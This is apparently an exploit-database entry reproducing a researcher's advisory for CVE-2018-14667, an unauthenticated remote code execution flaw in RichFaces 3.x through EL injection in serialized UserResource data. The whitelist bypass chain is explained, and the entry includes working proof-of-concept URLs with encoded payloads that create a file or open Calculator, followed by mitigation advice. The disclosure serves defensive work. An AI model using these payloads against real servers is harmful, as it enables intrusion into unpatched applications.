@@ -1,0 +1,231 @@
+id: 31661
+date: 11/21/2018
+title: Richfaces 3.x Remote Code Execution Vulnerability
+author: João Filho Matos Figueiredo
+cves: CVE-2018-14667
+
+Original report+advisories:
+
+TITLE:
+====================
+Unauthenticated Remote Code execution in WebApps using Richfaces 3.X all
+versions.
+
+RESUME
+====================
+RichFaces Framework 3.X through 3.3.4 (all versions) is vulnerable to
+Expression Language (EL)
+Injection via UserResource resource, allowing an unauthenticated remote
+attacker to execute Java
+arbitrary code and potentialy OS commanding using a special chain of java
+serialized objects
+inside a org.ajax4jsf.resource.UserResource$UriData.
+
+DETAILS
+====================
+PS: others details can be seen on the slides:
+https://www.slideshare.net/joaomatosff/a-little-bit-about-code-injection-in-webapplication-frameworks-cve201814667-h2hc-2018
+
+The Richfaces expects to receive a serialized resource of the type
+"org.ajax4jsf.resource.UserResource"
+via URLs with the pattern:
+"/a4j/s/3_3_3.Finalorg.ajax4jsf.resource.UserResource/n/s/{HashCode of the
+MimeType Resource}/DATA/{Encoded Serialized Object}".
+When this occurs, a check of allowed types is made using a restrict
+whitelist (Look-Ahead) in order to
+avoid deserialization vulnerabilities.
+
+Following is the Look-Ahead strict whitelist with the allowed types:
+
+1) org.ajax4jsf.resource.InternetResource
+2) org.ajax4jsf.resource.SerializableResource
+3) javax.el.Expression
+4) javax.faces.el.MethodBinding
+5) javax.faces.component.StateHolderSaver
+6) java.awt.Color
+
+However, although it is not vulnerable to deserialization, it is possible
+to construct a special chain
+of objects using only allowed types and containing a tainted Expression
+Language (EL) in a specific way
+that result in it being automatically evaluated by the UserResource class
+after the correct deserialization
+of the chain (after the cast, not before).
+
+In order to be vulnerable, an application only need to:
+
+1) Use the mediaOutput feature in any point at any time (the attacker don't
+need to know where this feature
+   is used. It just needs that this functionality had been used at any time
+by the application).
+
+If the point (1) is satisfied, the application will contains a resource
+inside an internal HashMap with the
+key like the following:
+
+                           /----- Resource Name
+                          \/
+Key: org.ajax4jsf.resource.UserResource/n/s/-1487394660 <--- HasCode of
+resource MimeType (eg "image/jpeg")
+                                                                  /\ /\
+                                                                  |   \____
+if the resource is of session scope (/s) or not (/n)
+                                                                   \_______
+if the resource is cacheable (/c) or not cacheable (/n)
+
+The original intent of the UserResource is to create or restore a resource
+(like images, flash, audio, etc)
+and send it back/draw to the user. So, this is one of the most commons
+features used by richfaces web
+applications.
+
+An attacker can abuse of this feature forcing the application to evaluate
+his tainted EL using a chain like
+the following:
+
+1] [Obj] org.ajax4jsf.resource.UserResource$UriData
+         createContent:
+2]         [Obj]javax.faces.component.StateHolderSaver
+                savedState:
+3]                [Obj] com.sun.facelets.el.TagMethodExpression
+                        orig:
+4]                         [obj] org.jboss.el.MethodExpressionImpl
+                                 exp:
+                                   "${OUR PAYLOAD}"                 <-----
+The malicious EL can be put here.
+
+In the previous chain, notice that all types used are allowed by the
+look-ahead protection:
+
+1] "org.ajax4jsf.resource.UserResource$UriData" is an
+"InternetResourceBase" that is an "InternetResource"
+   (whitelisted);
+2] "javax.faces.component.StateHolderSaver" (whitelisted)
+3] "com.sun.facelets.el.TagMethodExpression" is an "MethodExpression" that
+is and "Expression" (whitelisted)
+4] "org.jboss.el.MethodExpressionImpl" is and "MethodExpression"
+(whitelisted)
+
+Notice that the points [2] and [3] of the chain can also be changed in
+order to exploit different platforms.
+
+After create the exploit chain, it is needed to encode it properly and make
+an HTTP GET in the proper
+UserResource URL with the payload.
+eg. /a4j/s/3_3_3.Finalorg.ajax4jsf.resource.UserResource/n/n/DATA/{hashCode
+of mime}/payload
+
+The {hashCode of MimeType} is not always needed (depends on how the
+application uses these features).
+
+When the payload is received by the app, the chain is deserialized and the
+UserResource.send() method
+is invoked by the ResourceLifecycle.sendResource(). Inside this method, the
+content of UserResource$UriData
+is restored and our MethodExpression is invoked. Thus, our tainted data
+(EL) has reached a taint sink
+(MethodExpression.invoke()), leading to the EL evaluation.
+
+Stacktrace example:
+
+org.jboss.el.MethodExpressionImpl.invoke(MethodExpressionImpl.java:276)  <-
+This contains user controlled data!
+org.ajax4jsf.resource.UserResource.send(UserResource.java:109)
+org.ajax4jsf.resource.ResourceLifecycle.sendResource(ResourceLifecycle.java:221)
+org.ajax4jsf.resource.ResourceLifecycle.send(ResourceLifecycle.java:148)
+org.ajax4jsf.resource.InternetResourceService.serviceResource(InternetResourceService.java:226)
+org.ajax4jsf.resource.ResourceBuilderImpl.decrypt(ResourceBuilderImpl.java:626)
+org.ajax4jsf.resource.ResourceBuilderImpl.getResourceDataForKey(ResourceBuilderImpl.java:371)
+org.ajax4jsf.resource.InternetResourceService.serviceResource(InternetResourceService.java:156)
+org.ajax4jsf.resource.InternetResourceService.serviceResource(InternetResourceService.java:141)
+
+
+# PROOF OF CONCEPT #
+====================
+PS: You can see PoCs using JBoss and Tomcat in the following video:
+https://www.youtube.com/watch?v=HR7-nL5G91w
+
+In order to demonstrate this vulnerability, we can deploy a richfaces demo
+application in a Java Application
+Server/Container (eg. JBoss, tomcat, Jetty, WebLogic, etc).
+
+For the PoC, let's use the following configuration:
+
+1) Photoalbum demo application (that uses Richfaces v 3.3.4)
+2) JBoss AS 5.1.0.GA <http://5.1.0.ga/> or JBoss EAP 5.1.2
+
+* Deploying the lab:
+
+1) Get the demo app:
+http://downloads.jboss.org/richfaces/releases/3.3.X/3.3.4.Final/richfaces-examples-3.3.4.Final.zip
+2) Extract the richfaces-examples-3.3.4.Final.zip
+3) Copy the app in
+richfaces-examples-3.3.4.Final/photoalbum/dist/photoalbum-ear-3.3.4.Final.ear
+to the JBoss deploy dir
+   in jboss-5.1.0.GA/server/default/deploy
+<http://jboss-5.1.0.ga/server/default/deploy> (for 5.1.0.GA
+<http://5.1.0.ga/>) or jboss-eap-5.1/jboss-as/server/default/deploy (for
+5.1.2 eap)
+4) Start JBoss Application Server: cd bin ; ./run.sh -b 0.0.0.0
+5) Open the photoalbum index page. Eg. http://192.168.0.1:8080/photoalbum/
+6) Use the following PoCs (tested in JBoss EAP 5.1.2 and JBoss AS 5.1.0.GA
+<http://5.1.0.ga/>)
+
+1) (LINUX) Execute command: touch /tmp/richfaces0day_joaomatosf
+eg.
+http://192.168.0.1:8080/photoalbum/a4j/s/3_3_3.Finalorg.ajax4jsf.resource.UserResource/n/n/DATA/eAFdUs9r1EAY!bpYrL9ArSgehBqL7YpMBGsRakFai1Z2LXStoB7k2-Tb7IRkZpyZtKml3rwoePHqzate7MGz14KX!g2CiAgiiFdnksXS5pJ84c17b9773v-EYaPhktQJwxTLqdT0mCYjCx0RWzGklwfD-Irmt9Ai-Gf02o8GHGjBsUgTWpqXwpKwFk62UlzFMEORhEvdlCI704KDVCruOJ!CcxhqwUguY97jFA!m4VXMCqqGUjkvFz1FyXoYkWGRzJUUjpt1rBO6I7OYdAdXST!c3pp98!ZLuwGNFhyKMjTmHua010PHai4S5-GwcWfiisPC6doll2GHNMeMP8NuRjOl8vITTpKZQlQGMrKGUcbuY9Im25fxQqncTQyXosoBYOgoQKnhbG3aQffjPobbr77-nXrdqHCj!3G7TO9evOz8frRzwyO8g!O-jLQrTSW9n28xV1n315k!Rz6faHttH9zI2ifYGt8IApaQnfdRTDZZT2ofyGRQS5pIc-VirF4LIuGC2igwIR00maC1RWEsiojcSUdSA-bWBwzGYcj1VJMx3y9bLoTlOXn04NMdpZKiyQkri6g!FtpchZpH!arKKzGuP0klyhytNL2JZtDcBCg0jD6u6qhJB4V92Hnw7fu5jdtVJC7phoVT!hqMS7ZUWFVYByTMLRyvfleG6oVTqlxrwd0w4bZfdP0ChbuqYUqlD3bs5tXpy9PXx!as72xwYSOnmOMcoWBKS7eAZjNwa6H-AZCFGGE_
+
+2) (MACOS) Open Calculator
+eg.
+http://192.168.0.1:8080/photoalbum/a4j/s/3_3_3.Finalorg.ajax4jsf.resource.UserResource/n/n/DATA/eAFdUk1rFEEQrSwG4xeoEcWDEMdgsiI9B2MQYkCzBo3sGsgaQXOqna2d9DDT3Xb37I4u8eZFwYtXb171oOIP8Brwkt8giIgggni1e2ZRkr5M1!Dqvdev6s0PGDcaLkgdM0ywmEtMj2kyMtcRsXVDem1UTK9rfgMtgj-Tl7!XYF8TjkSa0FJDCkvCWjjeTLCPYYoiDlc7CUV2oQn7qVDccT6EJzDWhIlMdnmPU3dUj!cxzaksCuW8nPcUBethRIZFMlNSOG7Wtk7olky7pNvYJ31!-8Piy1efWzWoNeFAlKIxdzCj3R7aVnMROw8HjevplhwWTlYuuQzbpDmm!DF2UloolJefcZLM5KI0kJI1jFJ2F-MW2U3ZXS6Ue4nhUpQ5AIwdBig0nK5MO-he3Ptw-!mXP3MvaiVu8h!uP9Prp8!avx7sXPUI7-CsH0bSkaaU3su3kqm08!PU70OfjrW8tg9uYvAR3k0Pg4DFZBs-itk660ntA5kNKkkTaa5cjOVnWcRcUAsFxqSDOhM0WBHGoojIdTqSCrD0aMRgHIbcnCoy5ufL1nJheUYePbq6Vioomp2RisRUeF2plEdoXVgmbGAa5SlaqRkqNVMP6lsAuYbJjXIYFeVoXG937n39dmZ4swzE5VyzcMI!gnHJVnOrcuuAhJmFo-Xv0k61bkoVgybcDmNuN!OOX58wkSgzJ2x6YUKFj3Xq2qX5i!NXpnYt72JwbphRl-MSoWBKS7d-ZitwS6H-Ahv8F1M_
+
+PS: before execute the HTTP GET with the PoCs, you need to open the index
+page of the app (eg. http://192.168.0.1:8080/photoalbum/).
+
+PS: Note that for other application servers, you may need to generate other
+payloads.
+
+
+MITIGATION ADVICES
+====================
+Since richfaces has reached the end of life, users should apply their own
+fix. As a suggestion
+users can perform the sanitization of any EL received from the untrusted
+sources (tainted) or
+even to disable EL evaluation in the Richfaces.
+
+As the execution is triggered internally by the Richfaces lib, you can
+follow some paths, eg:
+Whenever your application receives a serialized object that will be catched
+by the richfaces,
+the method getResourceDataForKey of the class ResourceBuilderImpl invokes
+the class
+LookAheadObjectInputStream which will ensure that only the whitelisted
+types can be
+deserilized. After that, you can include a second whitelist to ensure that
+only trusted ELs
+used by your application can be allowed.
+
+
+FINAL CONSIDERATIONS
+====================
+RedHat rated this with CVSS3 Base Score 9.8 and issued the cve id
+CVE-2018-14667.
+Ref: https://access.redhat.com/security/cve/cve-2018-14667
+
+Until now, they released the following advisories about affected products:
+https://access.redhat.com/errata/RHSA-2018:3517
+https://access.redhat.com/errata/RHSA-2018:3518
+https://access.redhat.com/errata/RHSA-2018:3519
+https://access.redhat.com/errata/RHSA-2018:3581
+
+Since Richfaces framework is used by many private and opensource projects,
+it is very important
+to check your assets to ensure that you are not vulnerable.
+
+---------------
+Joao Filho Matos Figueiredo
+https://github.com/joaomatosf
+Twitter @joaomatosf
+
+#  0day.today [2023-03-27]  #
